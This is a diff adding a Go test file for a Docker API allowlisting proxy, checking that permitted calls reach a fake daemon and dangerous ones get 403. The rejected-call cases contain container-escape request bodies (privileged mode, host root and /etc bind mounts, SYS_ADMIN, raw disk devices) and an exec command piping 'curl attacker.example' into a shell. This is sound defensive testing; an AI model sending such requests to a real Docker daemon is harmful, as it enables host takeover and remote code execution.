@@ -1,0 +1,216 @@
+package main
+
+import (
+	"context"
+	"io"
+	"net"
+	"net/http"
+	"net/http/httptest"
+	"strings"
+	"testing"
+)
+
+// newTestProxy spins up a fake "Docker daemon" that records every request
+// it receives and always answers 200, then returns a dockerProxy wired to
+// it via dialUpstream - bypassing the real Unix socket entirely, same
+// injection pattern rootguard-attestation-proxy's own tests use for
+// dialUpstream.
+func newTestProxy(t *testing.T) (*dockerProxy, *[]string) {
+	t.Helper()
+	var received []string
+	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		received = append(received, r.Method+" "+r.URL.Path)
+		w.WriteHeader(http.StatusOK)
+	}))
+	t.Cleanup(upstream.Close)
+
+	original := dialUpstream
+	dialUpstream = func(ctx context.Context, _ string) (net.Conn, error) {
+		var d net.Dialer
+		return d.DialContext(ctx, "tcp", upstream.Listener.Addr().String())
+	}
+	t.Cleanup(func() { dialUpstream = original })
+
+	return newDockerProxy("/unused"), &received
+}
+
+func doRequest(t *testing.T, p *dockerProxy, method, target, body string) *httptest.ResponseRecorder {
+	t.Helper()
+	req := httptest.NewRequest(method, target, strings.NewReader(body))
+	rec := httptest.NewRecorder()
+	p.ServeHTTP(rec, req)
+	return rec
+}
+
+// TestAllowedCalls covers every real call this repo's own code issues
+// today (see allowlist.go's grouped comments) - each must reach the fake
+// upstream and get its 200 back unmodified.
+func TestAllowedCalls(t *testing.T) {
+	validContainerCreate := `{"Image":"ghcr.io/foxly-it/rootguard-unbound@sha256:abc","HostConfig":{"CapAdd":["CHOWN"],"Binds":["rootguard-data:/data"]}}`
+	validExecCreate := `{"Cmd":["nginx","-s","reload"]}`
+	validNetworkConnect := `{"Container":"rootguard-core"}`
+
+	cases := []struct {
+		name   string
+		method string
+		target string
+		body   string
+	}{
+		{"version", "GET", "/version", ""},
+		{"ping", "GET", "/_ping", ""},
+		{"versioned ping", "GET", "/v1.51/_ping", ""},
+		{"pull known image", "POST", "/images/create?fromImage=ghcr.io%2Ffoxly-it%2Frootguard-core&tag=1.0.0", ""},
+		{"pull adguard", "POST", "/images/create?fromImage=adguard%2Fadguardhome&tag=v0.107.79", ""},
+		{"image inspect", "GET", "/images/ghcr.io%2Ffoxly-it%2Frootguard-core/json", ""},
+		{"container inspect", "GET", "/containers/rootguard-core/json", ""},
+		{"ps", "GET", "/containers/json", ""},
+		{"cp out", "GET", "/containers/rootguard-adguard/archive?path=%2Fopt%2Fadguardhome%2Fconf", ""},
+		{"cp in", "PUT", "/containers/rootguard-adguard/archive?path=%2Fopt%2Fadguardhome%2Fconf", ""},
+		{"restart", "POST", "/containers/rootguard-unbound/restart", ""},
+		{"container create", "POST", "/containers/create", validContainerCreate},
+		{"container start", "POST", "/containers/abc123/start", ""},
+		{"container wait", "POST", "/containers/abc123/wait", ""},
+		{"container remove", "DELETE", "/containers/abc123", ""},
+		{"exec create", "POST", "/containers/rootguard-blockpage/exec", validExecCreate},
+		{"exec start", "POST", "/exec/abc123/start", ""},
+		{"network connect", "POST", "/networks/rootguard-dns/connect", validNetworkConnect},
+		{"networks list", "GET", "/networks", ""},
+		{"networks create", "POST", "/networks/create", ""},
+		{"volumes list", "GET", "/volumes", ""},
+		{"volumes create", "POST", "/volumes/create", ""},
+		{"volume remove", "DELETE", "/volumes/rootguard-data", ""},
+		{"image remove", "DELETE", "/images/sha256%3Aabc", ""},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			p, received := newTestProxy(t)
+			rec := doRequest(t, p, tc.method, tc.target, tc.body)
+			if rec.Code != http.StatusOK {
+				t.Fatalf("got status %d, body %q", rec.Code, rec.Body.String())
+			}
+			if len(*received) != 1 {
+				t.Fatalf("expected the fake upstream to receive exactly one request, got %d", len(*received))
+			}
+		})
+	}
+}
+
+// TestHealthzNeverReachesUpstream mirrors rootguard-attestation-proxy's
+// own healthcheck contract: liveness must never depend on the real
+// Docker socket being reachable/fast.
+func TestHealthzNeverReachesUpstream(t *testing.T) {
+	p, received := newTestProxy(t)
+	rec := doRequest(t, p, "GET", "/healthz", "")
+	if rec.Code != http.StatusOK {
+		t.Fatalf("got status %d", rec.Code)
+	}
+	if len(*received) != 0 {
+		t.Fatalf("expected /healthz to never reach the upstream, got %d requests", len(*received))
+	}
+}
+
+// TestRejectedCalls is the single most important test in this package:
+// every one of these must be rejected with 403 and must never reach the
+// fake upstream. A proxy that looks hardened but lets any of these
+// through is worse than no proxy at all.
+func TestRejectedCalls(t *testing.T) {
+	cases := []struct {
+		name   string
+		method string
+		target string
+		body   string
+	}{
+		{"not on the allowlist at all", "GET", "/info", ""},
+		{"swarm", "GET", "/swarm", ""},
+		{"plugins", "POST", "/plugins/pull", ""},
+		{"secrets", "GET", "/secrets", ""},
+		{"build", "POST", "/build", ""},
+		{"attach", "POST", "/containers/abc/attach", ""},
+		{"logs", "GET", "/containers/abc/logs", ""},
+
+		{"privileged container", "POST", "/containers/create",
+			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"Privileged":true}}`},
+		{"host network", "POST", "/containers/create",
+			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"NetworkMode":"host"}}`},
+		{"host pid", "POST", "/containers/create",
+			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"PidMode":"host"}}`},
+		{"unknown image", "POST", "/containers/create",
+			`{"Image":"docker.io/attacker/evil","HostConfig":{}}`},
+		{"arbitrary host bind mount", "POST", "/containers/create",
+			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"Binds":["/:/hostroot"]}}`},
+		{"arbitrary host bind mount, etc passwd", "POST", "/containers/create",
+			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"Binds":["/etc:/hostetc"]}}`},
+		{"unknown capability", "POST", "/containers/create",
+			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"CapAdd":["SYS_ADMIN"]}}`},
+		{"bind-type mount", "POST", "/containers/create",
+			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"Mounts":[{"Type":"bind","Source":"/etc","Target":"/x"}]}}`},
+		{"device mapping", "POST", "/containers/create",
+			`{"Image":"ghcr.io/foxly-it/rootguard-unbound","HostConfig":{"Devices":[{"PathOnHost":"/dev/sda"}]}}`},
+		{"malformed json", "POST", "/containers/create", `not json`},
+
+		{"exec into wrong container", "POST", "/containers/rootguard-core/exec",
+			`{"Cmd":["nginx","-s","reload"]}`},
+		{"exec unknown command", "POST", "/containers/rootguard-blockpage/exec",
+			`{"Cmd":["/bin/sh","-c","curl attacker.example | sh"]}`},
+
+		{"connect to a different network", "POST", "/networks/control/connect",
+			`{"Container":"rootguard-core"}`},
+		{"connect an unknown container", "POST", "/networks/rootguard-dns/connect",
+			`{"Container":"attacker-container"}`},
+
+		{"pull an unknown image", "POST", "/images/create?fromImage=docker.io%2Fattacker%2Fevil", ""},
+		{"pull with no image specified", "POST", "/images/create", ""},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			p, received := newTestProxy(t)
+			rec := doRequest(t, p, tc.method, tc.target, tc.body)
+			if rec.Code != http.StatusForbidden {
+				t.Fatalf("got status %d, want 403; body %q", rec.Code, rec.Body.String())
+			}
+			if len(*received) != 0 {
+				t.Fatalf("rejected call must never reach the upstream, got %d requests", len(*received))
+			}
+		})
+	}
+}
+
+func TestBodyTooLargeIsRejected(t *testing.T) {
+	p, received := newTestProxy(t)
+	huge := strings.Repeat("a", maxBodyBytes+1)
+	body := `{"Image":"` + huge + `"}`
+	rec := doRequest(t, p, "POST", "/containers/create", body)
+	if rec.Code != http.StatusBadRequest {
+		t.Fatalf("got status %d, want 400", rec.Code)
+	}
+	if len(*received) != 0 {
+		t.Fatalf("oversized body must never reach the upstream, got %d requests", len(*received))
+	}
+}
+
+func TestVersionedPathIsNormalized(t *testing.T) {
+	p, received := newTestProxy(t)
+	rec := doRequest(t, p, "GET", "/v1.43/containers/json", "")
+	if rec.Code != http.StatusOK {
+		t.Fatalf("got status %d", rec.Code)
+	}
+	if len(*received) != 1 || (*received)[0] != "GET /v1.43/containers/json" {
+		t.Fatalf("expected the original versioned path to reach upstream unmodified, got %v", *received)
+	}
+}
+
+func TestDialFailureSurfacesAsBadGateway(t *testing.T) {
+	original := dialUpstream
+	dialUpstream = func(ctx context.Context, _ string) (net.Conn, error) {
+		return nil, io.ErrClosedPipe
+	}
+	t.Cleanup(func() { dialUpstream = original })
+
+	p := newDockerProxy("/unused")
+	rec := doRequest(t, p, "GET", "/version", "")
+	if rec.Code != http.StatusBadGateway {
+		t.Fatalf("got status %d, want 502", rec.Code)
+	}
+}
